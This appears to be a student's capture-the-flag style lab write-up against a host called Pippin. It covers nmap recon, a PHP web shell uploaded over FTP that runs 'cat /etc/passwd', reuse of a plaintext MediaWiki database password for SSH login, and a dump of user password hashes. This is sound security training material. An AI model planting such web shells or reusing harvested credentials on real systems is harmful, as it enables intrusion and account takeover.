## Lab 7.1 - Exploiting Pippin

### recon
- nmap scan
<img width="779" height="237" alt="image" src="https://github.com/user-attachments/assets/1c5fd052-7e5f-4000-b26e-966fdb9f4587" />

- mediawiki is running on this server
- ftp is open:

<img width="579" height="199" alt="image" src="https://github.com/user-attachments/assets/973afa7a-795e-4eec-b6c0-9a36985e1d00" />

- `upload` folder allows file uploads
- upload web shell
```
<?php
$output = shell_exec('cat /etc/passwd');
echo "<pre>$output</pre>";
?>
```
- run webshell
<img width="644" height="548" alt="image" src="https://github.com/user-attachments/assets/66c9b7f5-fd95-424f-9846-5ed5b6304ab7" />

- `LocalSettings.php` has database password in plaintext
- we can assume this password was reused: use this password to login as **peregrin.took** via ssh

<img width="633" height="123" alt="image" src="https://github.com/user-attachments/assets/f517e1a8-8358-4ac1-b0e1-f9058178dfb5" />

- mediawiki users and pws:
```
MariaDB [mediawiki]> select user_name,user_password from user;
+-----------+-------------------------------------------------------------------------------------------------------------------------------------------+
| user_name | user_password                                                                                                                             |
+-----------+-------------------------------------------------------------------------------------------------------------------------------------------+
| Pippin    | :pbkdf2:sha512:30000:64:7zMbdjXKrFDDq4CRF5q9ow==:49ImFWdWRVz2dCDsJPj+P0Xovz153VenjKk7npuK7u5xgo21IUh+eY0QH8fQxdH/Cjx3zxZyQcfNChAnP11GNg== |
| Dyl       | :pbkdf2:sha512:30000:64:XbRxguyY4MYnH8axmhkcoA==:ST33JfNbNnWY8oDNWPWsxMgCzIg6Dq53XkAaxEe0yk5SvKWPkATGVj9Qs4k1mkPoFa1yfXYCTu7SYOXiTrgy5g== |
| Inf       | :pbkdf2:sha512:30000:64:JFJwUOwbO8d3VwUiEII+ig==:iREvWYmj5884HrJILCl68yKPBulxA5Mnhr1kexWY0CJ/+YMvQtSXn7dEHS9C7RX+SN0TWQ2hjZ21u7RE3mfC3A== |
+-----------+-------------------------------------------------------------------------------------------------------------------------------------------+
```
